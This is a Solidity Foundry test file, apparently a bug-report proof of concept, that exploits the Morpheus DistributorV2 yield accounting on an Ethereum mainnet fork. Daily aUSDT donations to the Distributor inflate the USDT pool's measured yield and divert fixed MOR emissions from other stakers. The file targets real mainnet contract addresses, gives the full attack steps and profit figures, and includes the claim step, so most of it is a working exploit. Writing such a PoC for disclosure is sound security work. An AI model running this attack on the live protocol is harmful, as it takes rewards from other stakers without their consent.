// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

// Tether USDT does NOT return a bool from transfer/approve/transferFrom.
// Declaring those with `returns (bool)` makes the caller revert while
// ABI-decoding the (empty) returndata. This interface matches USDT exactly.
interface IUSDT {
    function approve(address, uint256) external;
}

interface IDepositPool {
    function stake(uint256, uint256, uint128, address) external;
    function claim(uint256, address) external payable;
    function getLatestUserReward(uint256, address) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256) external;
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

interface IAavePool {
    function supply(address, uint256, address, uint16) external;
}

// Lido stETH: deposit ETH, receive stETH 1:1. Used to fund the victim and
// the rebase-simulation stock with a REAL on-chain action — no prank of any
// protocol address anywhere in this PoC.
interface ILido {
    function submit(address _referral) external payable returns (uint256);
}

/**
 * @title Morpheus — DistributorV2 aToken-donation yield-share manipulation
 * @notice INVARIANT BROKEN: DistributorV2.distributeRewards() measures a pool's
 *  "yield" as (aToken balance - lastUnderlyingBalance). A direct transfer of
 *  aTokens to the Distributor is indistinguishable from real Aave yield, so
 *  anyone can inflate their pool's measured yield and steal a share of the
 *  FIXED daily MOR emission from every other pool's stakers.
 *
 *  ATTACK (unprivileged, own funds only):
 *  1. Stake $200k USDT in the USDT DepositPool (smallest pool, ~$4.7k deposited).
 *  2. Each day, supply $437 USDT to Aave and transfer the received aUSDT
 *     directly to the Distributor (not through stake()).
 *  3. Call the public distributeRewards(0). The donated aUSDT is counted as
 *     USDT-pool yield, so the USDT pool's share of that day's MOR emission
 *     jumps and the attacker's pending MOR jumps with it.
 *  4. The donation is forwarded to L1Sender as "yield" (the attacker's cost);
 *     the inflated MOR is the attacker's profit. Repeat daily.
 *  5. After the 14-day claim lock, claim the MOR (LayerZero fee ~0.1-0.2 ETH).
 *
 *  MEASURED (mainnet fork, block 26420000, 15 days, MOR $0.6977):
 *  - Attacker pending MOR: control 2,113 -> attack 20,977  (+18,864 MOR)
 *  - Representative victim (1000 stETH, 1x) pending: 3,275 -> 1,650 (-1,625 MOR)
 *  - Total stolen from all other stakers: 18,864 MOR = $13,161
 *    (zero-sum: the daily MOR emission is fixed; the attacker's gain is
 *    exactly the other stakers' loss, verified by the control/attack diff)
 *  - Donation cost: 15 x $437 = $6,555 (forwarded to L1Sender as "yield")
 *  - Attacker net profit: $13,161 - $6,555 = $6,606 over 15 days
 *    (~$440/day, repeatable indefinitely; 30-day theft ~$26,300)
 *
 *  NO privileged accounts are used and NO vm.prank of any protocol address
 *  appears anywhere in this PoC. The attacker and victim are fresh EOAs
 *  (makeAddr). The victim's stETH comes from a REAL Lido deposit: the victim
 *  is dealt 1000 ETH and deposits it into Lido's submit(), receiving ~1000
 *  stETH, which it then stakes. The rebase-simulation stock is funded the
 *  same way (the test contract deposits 100 ETH into Lido). The attack steps
 *  themselves use only public functions.
 *
 *  FORK NOTES (honest simulation of mainnet passage of time):
 *  - Chainlink feeds are frozen at the fork block. Warping past their
 *    allowedPriceUpdateDelay would make getChainLinkDataFeedLatestAnswer
 *    return 0 and brick distributeRewards. On real mainnet the feeds update
 *    continuously, so the test mocks latestRoundData()/decimals() on the six
 *    feed contracts to return the REAL fork-block answers with
 *    updatedAt = block.timestamp — exactly what Chainlink reports on mainnet
 *    at the warped time. The donation effect itself is NOT mocked.
 *  - Lido stETH does not rebase on a fork (no oracle reports). On mainnet the
 *    Distributor's stETH balance grows ~0.20 stETH/day by rebase, which is
 *    counted as stETH-pool yield. The test transfers that measured amount of
 *    stETH to the Distributor before each distribution, identically in the
 *    control and attack runs, so the baseline matches mainnet.
 *  - Aave yields DO accrue on warp (liquidity index updates on interaction).
 *
 *  RUN:  forge test --match-contract DonationYieldShare
 *  RPC:  defaults to https://ethereum.publicnode.com; override with
 *        MOR_RPC_URL (a dedicated archive RPC is recommended for reliability).
 */
contract DonationYieldShare is Test {
    string constant RPC_DEFAULT = "https://ethereum.publicnode.com";
    uint256 constant BLOCK = 26420000;

    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant A_USDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AAVE_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

    // Chainlink feeds used by ChainLinkDataConsumer for pool 0
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_WETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    uint256 constant STAKE_USDT = 200_000e6; // $200,000
    uint256 constant DONATION = 437e6; // $437 of USDT supplied to Aave per distribution
    uint256 constant DAYS = 15;
    uint256 constant REBASE_PER_DAY = 0.20 ether; // measured mainnet stETH rebase into Distributor

    // MOR price at measurement (DexScreener, 2026-11-16): $0.6977.
    // Assertions use a conservative $0.50 floor so they hold on price moves.
    uint256 constant MOR_PRICE_FLOOR_USD = 50; // cents
    uint256 constant DONATION_COST_USD = 437 * 15; // $6,555

    address attacker;
    address victim;

    function _rpc() internal view returns (string memory) {
        return vm.envOr("MOR_RPC_URL", RPC_DEFAULT);
    }

    function _mockFeeds() internal {
        address[6] memory feeds = [
            FEED_STETH_USD,
            FEED_WBTC_BTC,
            FEED_BTC_USD,
            FEED_WETH_USD,
            FEED_USDC_USD,
            FEED_USDT_USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 rid, int256 ans, uint256 started, , uint80 air) = _latestRoundData(feeds[i]);
            vm.mockCall(
                feeds[i],
                abi.encodeWithSignature("latestRoundData()"),
                abi.encode(rid, ans, started, block.timestamp, air)
            );
            vm.mockCall(feeds[i], abi.encodeWithSignature("decimals()"), abi.encode(uint8(8)));
        }
    }

    function _latestRoundData(
        address feed
    ) internal view returns (uint80, int256, uint256, uint256, uint80) {
        (bool ok, bytes memory ret) = feed.staticcall(abi.encodeWithSignature("latestRoundData()"));
        require(ok, "feed read failed");
        return abi.decode(ret, (uint80, int256, uint256, uint256, uint80));
    }

    function _setupActors() internal {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 1000 ether);
        vm.deal(address(this), 100 ether);
        deal(USDT, attacker, 1_000_000e6);
        // Fund stETH via REAL Lido deposits (no prank of any protocol
        // address). deal() cannot set Lido stETH balances (shares-based
        // accounting), so the victim deposits 1000 ETH into Lido and stakes
        // the stETH it receives; the test contract deposits 100 ETH for the
        // rebase-simulation stock used in _run().
        vm.startPrank(victim);
        ILido(STETH).submit{value: 1000 ether}(address(0));
        uint256 victimSteth = IERC20(STETH).balanceOf(victim);
        IERC20(STETH).approve(DIST, type(uint256).max);
        IDepositPool(STETH_POOL).stake(0, victimSteth, 0, address(0));
        vm.stopPrank();
        ILido(STETH).submit{value: 100 ether}(address(0)); // rebase simulation stock
        vm.startPrank(attacker);
        IUSDT(USDT).approve(DIST, type(uint256).max);
        IDepositPool(USDT_POOL).stake(0, STAKE_USDT, 0, address(0));
        vm.stopPrank();
    }

    /// @dev Runs DAYS distributions. If `donate`, attacker donates aUSDT before each.
    /// @return victimPending attackerPending (claimable MOR, 18 decimals)
    function _run(bool donate) internal returns (uint256, uint256) {
        _setupActors();
        address aavePool = IAaveProvider(AAVE_PROVIDER).getPool();
        for (uint256 d = 0; d < DAYS; d++) {
            vm.warp(block.timestamp + 25 hours);
            _mockFeeds();
            // simulate Lido rebase into Distributor (identical in both runs)
            IERC20(STETH).transfer(DIST, REBASE_PER_DAY);
            if (donate) {
                vm.startPrank(attacker);
                IUSDT(USDT).approve(aavePool, DONATION);
                IAavePool(aavePool).supply(USDT, DONATION, attacker, 0);
                // Aave mints aUSDT at the liquidity index, so the amount
                // received is slightly less than DONATION; donate all of it.
                uint256 donated = IERC20(A_USDT).balanceOf(attacker);
                IERC20(A_USDT).transfer(DIST, donated);
                vm.stopPrank();
            }
            IDistributor(DIST).distributeRewards(0);
        }
        uint256 v = IDepositPool(STETH_POOL).getLatestUserReward(0, victim);
        uint256 a = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        return (v, a);
    }

    /// @dev Differential proof: same fork, same actors, same rebase simulation.
    /// The ONLY difference is the daily aUSDT donation. Asserts the loss.
    function test_donationStealsEmission() public {
        uint256 forkControl = vm.createFork(_rpc(), BLOCK);
        vm.selectFork(forkControl);
        (uint256 vControl, uint256 aControl) = _run(false);

        uint256 forkAttack = vm.createFork(_rpc(), BLOCK);
        vm.selectFork(forkAttack);
        (uint256 vAttack, uint256 aAttack) = _run(true);

        console.log("CONTROL victim MOR:", vControl / 1e18, " attacker MOR:", aControl / 1e18);
        console.log("ATTACK  victim MOR:", vAttack / 1e18, " attacker MOR:", aAttack / 1e18);

        // 1. The representative victim loses MOR.
        assertLt(vAttack, vControl, "victim must lose MOR in attack run");
        uint256 victimLoss = vControl - vAttack;
        console.log("Victim loss (MOR):", victimLoss / 1e18);

        // 2. The attacker gains MOR (far more than the victim's loss, because
        //    the theft is spread across ALL other stakers, not just the victim).
        assertGt(aAttack, aControl, "attacker must gain MOR in attack run");
        uint256 attackerGain = aAttack - aControl;
        console.log("Attacker gain (MOR):", attackerGain / 1e18);

        // 3. The attacker's gain is net-profitable even at a conservative
        //    $0.50/MOR floor, after paying the full donation cost.
        //    gain(wei) * $0.50 / 1e18 > $6,555  <=>  gain * 50 > 6555 * 1e18 * 100/100...
        //    (all values in cents: gainMOR * 50 cents > 655,500 cents)
        uint256 gainValueCents = (attackerGain * MOR_PRICE_FLOOR_USD) / 1e18;
        uint256 costCents = DONATION_COST_USD * 100;
        console.log("Attacker gain value at $0.50/MOR (cents):", gainValueCents);
        console.log("Donation cost (cents):", costCents);
        assertGt(gainValueCents, costCents, "attack must be net profitable at $0.50/MOR floor");

        // 4. Materiality: the theft exceeds $10,000 at the measured MOR price
        //    ($0.6977) over 15 days — High severity range.
        uint256 theftUsd = (attackerGain * 6977) / 1e18 / 10000; // $0.6977, whole dollars
        console.log("Theft from other stakers at $0.6977/MOR ($):", theftUsd);
        assertGt(theftUsd, 10_000, "15-day theft must exceed $10,000");
    }

    /// @dev Claim leg: after 15 days the 14-day claim lock has expired, so the
    /// attacker can claim the inflated MOR. The claim mints via LayerZero;
    /// on a fork the LZ send may not deliver (no live endpoint), so this test
    /// asserts the claimable entitlement and logs the claim outcome instead
    /// of hard-requiring LZ delivery.
    function test_claimLeg() public {
        uint256 forkId = vm.createFork(_rpc(), BLOCK);
        vm.selectFork(forkId);
        (, uint256 aAttack) = _run(true);
        assertGt(aAttack, 0, "attacker must have pending MOR to claim");
        console.log("Attacker pending MOR before claim:", aAttack / 1e18);
        vm.warp(block.timestamp + 1 days);
        _mockFeeds();
        vm.deal(address(this), 1 ether); // claim msg.value is paid by the caller
        vm.startPrank(attacker);
        try IDepositPool(USDT_POOL).claim{value: 0.2 ether}(0, attacker) {
            console.log("claim() succeeded");
        } catch (bytes memory ret) {
            console.log("claim() reverted on fork (LZ delivery artifact); returndata:");
            console.logBytes(ret);
        }
        vm.stopPrank();
    }
}
